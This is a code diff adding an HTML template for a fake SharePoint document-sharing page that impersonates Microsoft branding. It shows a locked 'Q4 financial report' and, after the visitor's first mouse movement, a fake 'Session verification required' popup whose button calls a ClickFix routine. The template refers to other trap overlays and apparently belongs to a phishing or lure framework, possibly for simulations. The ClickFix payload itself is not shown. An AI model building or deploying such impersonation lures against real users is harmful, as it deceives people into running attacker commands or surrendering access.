@@ -1,0 +1,205 @@
+{% extends "base_layout.html" %}
+
+{% block title %}SharePoint - Document Shared With You{% endblock %}
+
+{% block content %}
+<!-- Decoy Layer: SharePoint document preview interface -->
+<div id="decoy-layer" style="background-color: #f3f2f1; min-height: 100vh; font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;">
+    
+    <!-- SharePoint Header -->
+    <header style="background-color: #0078d4; padding: 12px 20px; display: flex; align-items: center; justify-content: space-between;">
+        <div style="display: flex; align-items: center; gap: 15px;">
+            <!-- SharePoint Logo -->
+            <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="16" cy="10" r="8" fill="#038387"/>
+                <circle cx="22" cy="18" r="6" fill="#37a76f"/>
+                <circle cx="12" cy="22" r="5" fill="#03787c"/>
+            </svg>
+            <span style="color: white; font-size: 18px; font-weight: 600;">SharePoint</span>
+        </div>
+        <div style="display: flex; align-items: center; gap: 20px;">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.89 2 2 2zm6-6v-5c0-3.07-1.64-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.63 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2z"/></svg>
+            <div style="width: 32px; height: 32px; border-radius: 50%; background-color: #5c2d91; display: flex; align-items: center; justify-content: center; color: white; font-weight: 600; font-size: 14px;">JD</div>
+        </div>
+    </header>
+
+    <!-- Breadcrumb -->
+    <div style="background-color: white; padding: 12px 20px; border-bottom: 1px solid #edebe9;">
+        <div style="display: flex; align-items: center; gap: 8px; font-size: 14px; color: #323130;">
+            <span style="color: #0078d4; cursor: pointer;">Contoso Corp</span>
+            <span style="color: #a19f9d;">›</span>
+            <span style="color: #0078d4; cursor: pointer;">Shared Documents</span>
+            <span style="color: #a19f9d;">›</span>
+            <span>Q4_Financial_Report_2024.xlsx</span>
+        </div>
+    </div>
+
+    <!-- Document Preview Area -->
+    <div style="max-width: 900px; margin: 30px auto; padding: 0 20px;">
+        
+        <!-- Document Card -->
+        <div style="background-color: white; border-radius: 4px; box-shadow: 0 1.6px 3.6px rgba(0,0,0,0.13), 0 0.3px 0.9px rgba(0,0,0,0.1); overflow: hidden;">
+            
+            <!-- Document Header -->
+            <div style="padding: 20px; border-bottom: 1px solid #edebe9; display: flex; align-items: center; justify-content: space-between;">
+                <div style="display: flex; align-items: center; gap: 15px;">
+                    <!-- Excel Icon -->
+                    <svg width="40" height="40" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <rect width="48" height="48" rx="4" fill="#107c41"/>
+                        <path d="M32 12H16c-2.2 0-4 1.8-4 4v16c0 2.2 1.8 4 4 4h16c2.2 0 4-1.8 4-4V16c0-2.2-1.8-4-4-4z" fill="#21a366"/>
+                        <path d="M28 20h-8v2h8v-2zm0 4h-8v2h8v-2zm0 4h-8v2h8v-2z" fill="white"/>
+                        <text x="24" y="30" text-anchor="middle" fill="white" font-size="10" font-weight="bold">X</text>
+                    </svg>
+                    <div>
+                        <h2 style="margin: 0; font-size: 18px; font-weight: 600; color: #323130;">Q4_Financial_Report_2024.xlsx</h2>
+                        <p style="margin: 4px 0 0 0; font-size: 12px; color: #605e5c;">Shared by Sarah Johnson • Finance Department</p>
+                    </div>
+                </div>
+                <div style="display: flex; gap: 10px;">
+                    <button style="background: none; border: 1px solid #8a8886; padding: 8px 16px; border-radius: 2px; cursor: pointer; font-size: 14px; color: #323130;">Download</button>
+                    <button style="background: #0078d4; border: none; padding: 8px 16px; border-radius: 2px; cursor: pointer; font-size: 14px; color: white;">Open in Excel</button>
+                </div>
+            </div>
+
+            <!-- Blurred Document Preview -->
+            <div style="position: relative; padding: 40px; background: linear-gradient(135deg, #f8f8f8 0%, #e8e8e8 100%); min-height: 400px;">
+                
+                <!-- Fake spreadsheet content (blurred) -->
+                <div style="filter: blur(6px); pointer-events: none;">
+                    <table style="width: 100%; border-collapse: collapse; background: white; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
+                        <thead>
+                            <tr style="background: #107c41; color: white;">
+                                <th style="padding: 12px; text-align: left; border: 1px solid #0d6535;">Department</th>
+                                <th style="padding: 12px; text-align: right; border: 1px solid #0d6535;">Q1</th>
+                                <th style="padding: 12px; text-align: right; border: 1px solid #0d6535;">Q2</th>
+                                <th style="padding: 12px; text-align: right; border: 1px solid #0d6535;">Q3</th>
+                                <th style="padding: 12px; text-align: right; border: 1px solid #0d6535;">Q4</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr><td style="padding: 10px; border: 1px solid #ddd;">Sales</td><td style="padding: 10px; border: 1px solid #ddd; text-align: right;">$1,245,000</td><td style="padding: 10px; border: 1px solid #ddd; text-align: right;">$1,389,000</td><td style="padding: 10px; border: 1px solid #ddd; text-align: right;">$1,567,000</td><td style="padding: 10px; border: 1px solid #ddd; text-align: right;">$1,823,000</td></tr>
+                            <tr style="background: #f9f9f9;"><td style="padding: 10px; border: 1px solid #ddd;">Marketing</td><td style="padding: 10px; border: 1px solid #ddd; text-align: right;">$456,000</td><td style="padding: 10px; border: 1px solid #ddd; text-align: right;">$512,000</td><td style="padding: 10px; border: 1px solid #ddd; text-align: right;">$478,000</td><td style="padding: 10px; border: 1px solid #ddd; text-align: right;">$534,000</td></tr>
+                            <tr><td style="padding: 10px; border: 1px solid #ddd;">Operations</td><td style="padding: 10px; border: 1px solid #ddd; text-align: right;">$789,000</td><td style="padding: 10px; border: 1px solid #ddd; text-align: right;">$823,000</td><td style="padding: 10px; border: 1px solid #ddd; text-align: right;">$856,000</td><td style="padding: 10px; border: 1px solid #ddd; text-align: right;">$912,000</td></tr>
+                            <tr style="background: #f9f9f9;"><td style="padding: 10px; border: 1px solid #ddd;">Engineering</td><td style="padding: 10px; border: 1px solid #ddd; text-align: right;">$2,134,000</td><td style="padding: 10px; border: 1px solid #ddd; text-align: right;">$2,267,000</td><td style="padding: 10px; border: 1px solid #ddd; text-align: right;">$2,445,000</td><td style="padding: 10px; border: 1px solid #ddd; text-align: right;">$2,678,000</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <!-- Lock Overlay -->
+                <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); text-align: center; background: rgba(255,255,255,0.95); padding: 30px 50px; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.15);">
+                    <svg width="48" height="48" viewBox="0 0 24 24" fill="#0078d4" style="margin-bottom: 15px;">
+                        <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
+                    </svg>
+                    <h3 style="margin: 0 0 10px 0; color: #323130; font-size: 18px;">Document Protected</h3>
+                    <p style="margin: 0; color: #605e5c; font-size: 14px;">Verify your identity to view this document</p>
+                </div>
+            </div>
+
+            <!-- Document Info Footer -->
+            <div style="padding: 15px 20px; background: #faf9f8; border-top: 1px solid #edebe9; display: flex; justify-content: space-between; font-size: 12px; color: #605e5c;">
+                <span>Last modified: November 28, 2024 at 3:45 PM</span>
+                <span>Size: 2.4 MB • 12 sheets</span>
+            </div>
+        </div>
+
+        <!-- Sharing Info -->
+        <div style="margin-top: 20px; padding: 15px; background: white; border-radius: 4px; box-shadow: 0 1.6px 3.6px rgba(0,0,0,0.13);">
+            <h4 style="margin: 0 0 10px 0; font-size: 14px; color: #323130;">Shared with you</h4>
+            <div style="display: flex; align-items: center; gap: 10px;">
+                <div style="width: 32px; height: 32px; border-radius: 50%; background-color: #0078d4; display: flex; align-items: center; justify-content: center; color: white; font-weight: 600; font-size: 12px;">SJ</div>
+                <div>
+                    <p style="margin: 0; font-size: 14px; color: #323130;">Sarah Johnson</p>
+                    <p style="margin: 2px 0 0 0; font-size: 12px; color: #605e5c;">sarah.johnson@contoso.com • Can edit</p>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{# Define embedded attack layer - only shown if no external trap_type is set #}
+{% block attack_layer %}
+{% if not trap_type %}
+<!-- Attack Layer: Session verification popup -->
+<div id="attack-layer" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.5); backdrop-filter: blur(2px); z-index: 900; justify-content: center; align-items: center;">
+    <div style="background-color: white; max-width: 420px; width: 90%; border-radius: 4px; box-shadow: 0 25px 50px rgba(0,0,0,0.25); overflow: hidden;">
+        
+        <!-- Microsoft Header -->
+        <div style="padding: 24px 24px 0 24px;">
+            <svg width="108" height="24" viewBox="0 0 108 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect width="11" height="11" fill="#f25022"/>
+                <rect x="12" width="11" height="11" fill="#7fba00"/>
+                <rect y="12" width="11" height="11" fill="#00a4ef"/>
+                <rect x="12" y="12" width="11" height="11" fill="#ffb900"/>
+                <text x="28" y="17" fill="#5e5e5e" font-family="Segoe UI" font-size="14" font-weight="600">Microsoft</text>
+            </svg>
+        </div>
+
+        <!-- Content -->
+        <div style="padding: 24px;">
+            <h2 style="margin: 0 0 12px 0; font-size: 20px; font-weight: 600; color: #1b1b1b;">Session verification required</h2>
+            <p style="margin: 0 0 20px 0; font-size: 14px; color: #616161; line-height: 1.5;">
+                Your SharePoint session has expired due to inactivity. To protect your data, please verify your identity to continue accessing this document.
+            </p>
+
+            <!-- Warning Box -->
+            <div style="background: #fff4ce; border-left: 4px solid #ffb900; padding: 12px 16px; margin-bottom: 20px;">
+                <div style="display: flex; align-items: flex-start; gap: 10px;">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="#d83b01" style="flex-shrink: 0; margin-top: 2px;">
+                        <path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/>
+                    </svg>
+                    <div>
+                        <p style="margin: 0; font-size: 13px; color: #323130; font-weight: 600;">Security Notice</p>
+                        <p style="margin: 4px 0 0 0; font-size: 12px; color: #605e5c;">Document access requires verification due to sensitivity level.</p>
+                    </div>
+                </div>
+            </div>
+
+            <button onclick="triggerClickFix()" style="width: 100%; background-color: #0078d4; color: white; border: none; padding: 12px; font-size: 14px; font-weight: 600; cursor: pointer; border-radius: 2px; transition: background 0.2s;" onmouseover="this.style.backgroundColor='#106ebe'" onmouseout="this.style.backgroundColor='#0078d4'">
+                Verify Identity
+            </button>
+
+            <p style="margin: 16px 0 0 0; font-size: 12px; color: #616161; text-align: center;">
+                Having trouble? <a href="#" style="color: #0078d4; text-decoration: none;">Contact your IT administrator</a>
+            </p>
+        </div>
+
+        <!-- Footer -->
+        <div style="padding: 12px 24px; background: #faf9f8; border-top: 1px solid #edebe9;">
+            <p style="margin: 0; font-size: 11px; color: #8a8886; text-align: center;">
+                © 2024 Microsoft Corporation. All rights reserved.
+            </p>
+        </div>
+    </div>
+</div>
+{% endif %}
+{% endblock %}
+
+{% block extra_js %}
+<script>
+    let triggered = false;
+
+    function showLure() {
+        if (!triggered) {
+            triggered = true;
+            // Check for embedded attack layer first, then external trap overlays
+            const attackLayer = document.getElementById('attack-layer') ||
+                               document.getElementById('cf-overlay') ||
+                               document.getElementById('chrome-overlay') ||
+                               document.getElementById('wu-trigger-overlay') ||
+                               document.getElementById('filefix-overlay');
+            if (attackLayer) {
+                attackLayer.style.display = 'flex';
+            }
+        }
+    }
+
+    // Trigger on mouse movement (user engagement)
+    document.addEventListener('mousemove', function() {
+        if (!triggered) {
+            setTimeout(showLure, 1200);
+        }
+    }, { once: true });
+</script>
+{% endblock %}
